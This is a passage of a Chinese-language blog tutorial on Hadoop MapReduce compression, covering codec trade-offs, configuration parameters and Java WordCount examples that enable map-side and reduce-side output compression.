压缩</h2><ul><li>优点：压缩率高；支持 Split；</li><li>缺点：压缩&#x2F;解压速度慢。</li></ul><h2 id="3-3-Lzo-压缩"><a href="#3-3-Lzo-压缩" class="headerlink" title="3.3 Lzo 压缩"></a>3.3 Lzo 压缩</h2><ul><li>优点：压缩&#x2F;解压速度比较快；支持 Split；</li><li>缺点：压缩率一般；想支持切片需要额外创建索引。</li></ul><h2 id="3-4-Snappy-压缩"><a href="#3-4-Snappy-压缩" class="headerlink" title="3.4 Snappy 压缩"></a>3.4 Snappy 压缩</h2><ul><li>优点：压缩和解压缩速度快；</li><li>缺点：不支持 Split；压缩率一般；</li></ul><h1 id="四：压缩位置选择"><a href="#四：压缩位置选择" class="headerlink" title="四：压缩位置选择"></a>四：压缩位置选择</h1><p>压缩可以在 MapReduce 作用的任意阶段启用。</p><p><img src="/blog/40919b9a.html/image-20230210155254105.png"></p><h1 id="五：压缩参数配置"><a href="#五：压缩参数配置" class="headerlink" title="五：压缩参数配置"></a>五：压缩参数配置</h1><h2 id="5-1-为了支持多种压缩-x2F-解压缩算法，Hadoop-引入了编码-x2F-解码器"><a href="#5-1-为了支持多种压缩-x2F-解压缩算法，Hadoop-引入了编码-x2F-解码器" class="headerlink" title="5.1 为了支持多种压缩&#x2F;解压缩算法，Hadoop 引入了编码&#x2F;解码器"></a>5.1 为了支持多种压缩&#x2F;解压缩算法，Hadoop 引入了编码&#x2F;解码器</h2><table><thead><tr><th>压缩格式</th><th>对应的编码&#x2F;解码器</th></tr></thead><tbody><tr><td>DEFLATE</td><td>org.apache.hadoop.io.compress.DefaultCodec</td></tr><tr><td>gzip</td><td>org.apache.hadoop.io.compress.GzipCodec</td></tr><tr><td>bzip2</td><td>org.apache.hadoop.io.compress.BZip2Codec</td></tr><tr><td>LZO</td><td>com.hadoop.compression.lzo.LzopCodec</td></tr><tr><td>Snappy</td><td>org.apache.hadoop.io.compress.SnappyCodec</td></tr></tbody></table><h2 id="5-2-要在-Hadoop-中启用压缩，可以配置如下参数"><a href="#5-2-要在-Hadoop-中启用压缩，可以配置如下参数" class="headerlink" title="5.2 要在 Hadoop 中启用压缩，可以配置如下参数"></a>5.2 要在 Hadoop 中启用压缩，可以配置如下参数</h2><table><thead><tr><th>参数</th><th>默认值</th><th>阶段</th><th>建议</th></tr></thead><tbody><tr><td>io.compression.codecs  （在 core-site.xml 中配置）</td><td>无，这个需要在命令行输入 hadoop checknative 查看</td><td>输入压缩</td><td>Hadoop 使用文件扩展 名判断是否支持某种编解码器</td></tr><tr><td>mapreduce.map.output.compr ess（在 mapred-site.xml 中 配置）</td><td>false</td><td>mapper 输出</td><td>这个参数设为 true 启 用压缩</td></tr><tr><td>mapreduce.map.output.compr ess.codec（在 mapredsite.xml 中配置）</td><td>org.apache.hadoop.io.com press.DefaultCodec</td><td>mapper 输出</td><td>企业多使用 LZO 或 Snappy 编解码器在此 阶段压缩数据</td></tr><tr><td>mapreduce.output.fileoutpu tformat.compress（在 mapred-site.xml 中配置）</td><td>false</td><td>reducer 输出</td><td>这个参数设为 true 启 用压缩</td></tr><tr><td>mapreduce.output.fileoutpu tformat.compress.codec（在 mapred-site.xml 中配置）</td><td>org.apache.hadoop.io.com press.DefaultCodec</td><td>reducer 输出</td><td>使用标准工具或者编 解码器，如 gzip 和 bzip2</td></tr></tbody></table><h1 id="六：压缩实操案例"><a href="#六：压缩实操案例" class="headerlink" title="六：压缩实操案例"></a>六：压缩实操案例</h1><h2 id="6-1-Map-输出端采用压缩"><a href="#6-1-Map-输出端采用压缩" class="headerlink" title="6.1 Map 输出端采用压缩"></a>6.1 Map 输出端采用压缩</h2><p>即使你的 MapReduce 的输入输出文件都是未压缩的文件，你仍然可以对 Map 任务的中 间结果输出做压缩，因为它要写在硬盘并且通过网络传输到 Reduce 节点，对其压缩可以提高很多性能。</p><p>Hadoop 源码支持的压缩格式有：BZip2Codec、DefaultCodec</p><h3 id="（1）驱动器-Driver"><a href="#（1）驱动器-Driver" class="headerlink" title="（1）驱动器 Driver"></a>（1）驱动器 Driver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.compress.mapCompress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.compress.BZip2Codec;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.compress.CompressionCodec;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.CombineTextInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:40 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       1.拿到配置环境变量</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">         * CreateTime: 16:28 2023/2/10</span></span><br><span class="line"><span class="comment">         * Description: 开启map端输出压缩</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        configuration.setBoolean(<span class="string">&quot;mapreduce.map.output.compress&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置map端输出压缩方式</span></span><br><span class="line">        configuration.setClass(<span class="string">&quot;mapreduce.map.output.compress.codec&quot;</span>, BZip2Codec.class, CompressionCodec.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       2.拿到job作业对象</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(configuration, <span class="string">&quot;WordCount-MR&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       3.设置主类，（即：告知集群入口jar包在哪）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *      4.设置 mapper combiner reducer</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCountReducer.class);</span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       5.设置输出 key value的类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        job.setInputFormatClass(CombineTextInputFormat.class);</span><br><span class="line">        CombineTextInputFormat.setMaxInputSplitSize(job, <span class="number">4194304</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       6.设置输入、输出的数据路径</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\input&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output888&quot;</span>));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       7.提交执行</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）Mapper-保持不变"><a href="#（2）Mapper-保持不变" class="headerlink" title="（2）Mapper 保持不变"></a>（2）Mapper 保持不变</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.compress.mapCompress;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:40 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;Object, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个常用的IntWritable对象，对 java 整形的封装</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">intWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个 String 的封装类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">Text</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 覆写map方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException 1.对输入的文件，以行为单位进行切分，按规则切分（空格）；</span></span><br><span class="line"><span class="comment">     *                              2.遍历切分完成后的集合或迭代器</span></span><br><span class="line"><span class="comment">     *                              3.组合&lt;key,value&gt;,通过Context进行输出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 将传入的数据转换为字符串 指定分割符号为逗号</span></span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">stringTokenizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(value.toString(), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="comment">// 循环获取每个逗号分割出来的元素</span></span><br><span class="line">        <span class="keyword">while</span> (stringTokenizer.hasMoreTokens()) &#123;</span><br><span class="line">            <span class="comment">// 接收获取元素</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">word</span> <span class="operator">=</span> stringTokenizer.nextToken();</span><br><span class="line">            <span class="comment">// 添加分割后的元素到封装类中</span></span><br><span class="line">            text.set(word);</span><br><span class="line">            <span class="comment">// 上下文调度</span></span><br><span class="line">            context.write(text, intWritable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Reducer-保持不变"><a href="#（3）Reducer-保持不变" class="headerlink" title="（3）Reducer 保持不变"></a>（3）Reducer 保持不变</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.compress.mapCompress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:41 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义一个存储 int类型的求和结果的变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">sumIntWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 以key相同的组为单位处理，即 Reducer 方法调用一次，处理同 key的组数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 定义一个总词频变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 循环计数</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable val : values) &#123;</span><br><span class="line">            count += val.get();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将频数封装</span></span><br><span class="line">        sumIntWritable.set(count);</span><br><span class="line">        <span class="comment">// 上下文调度</span></span><br><span class="line">        context.write(key, sumIntWritable);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-Reduce-输出端采用压缩"><a href="#6-2-Reduce-输出端采用压缩" class="headerlink" title="6.2 Reduce 输出端采用压缩"></a>6.2 Reduce 输出端采用压缩</h2><h3 id="（1）驱动器-Driver-1"><a href="#（1）驱动器-Driver-1" class="headerlink" title="（1）驱动器 Driver"></a>（1）驱动器 Driver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.compress.reduceCompress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.compress.BZip2Codec;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.compress.CompressionCodec;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.compress.DefaultCodec;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.compress.GzipCodec;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.CombineTextInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:40 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       1.拿到配置环境变量</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">         * CreateTime: 16:28 2023/2/10</span></span><br><span class="line"><span class="comment">         * Description: 开启map端输出压缩</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        configuration.setBoolean(<span class="string">&quot;mapreduce.map.output.compress&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置map端输出压缩方式</span></span><br><span class="line">        configuration.setClass(<span class="string">&quot;mapreduce.map.output.compress.codec&quot;</span>, BZip2Codec.class, CompressionCodec.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       2.拿到job作业对象</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(configuration, <span class="string">&quot;WordCount-MR&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       3.设置主类，（即：告知集群入口jar包在哪）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *      4.设置 mapper combiner reducer</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCountReducer.class);</span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       5.设置输出 key value的类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        job.setInputFormatClass(CombineTextInputFormat.class);</span><br><span class="line">        CombineTextInputFormat.setMaxInputSplitSize(job, <span class="number">4194304</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">         * CreateTime: 16:33 2023/2/10</span></span><br><span class="line"><span class="comment">         * Description: 设置reduce端输出压缩开启</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FileOutputFormat.setCompressOutput(job, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置压缩的方式</span></span><br><span class="line"><span class="comment">//        FileOutputFormat.setOutputCompressorClass(job, BZip2Codec.class);</span></span><br><span class="line"><span class="comment">//        FileOutputFormat.setOutputCompressorClass(job, GzipCodec.class);</span></span><br><span class="line">        FileOutputFormat.setOutputCompressorClass(job, DefaultCodec.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       6.设置输入、输出的数据路径</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\input&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output666&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       7.提交执行</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）Mapper-保持不变-1"><a href="#（2）Mapper-保持不变-1" class="headerlink" title="（2）Mapper 保持不变"></a>（2）Mapper 保持不变</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.compress.reduceCompress;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:40 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;Object, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个常用的IntWritable对象，对 java 整形的封装</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">intWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 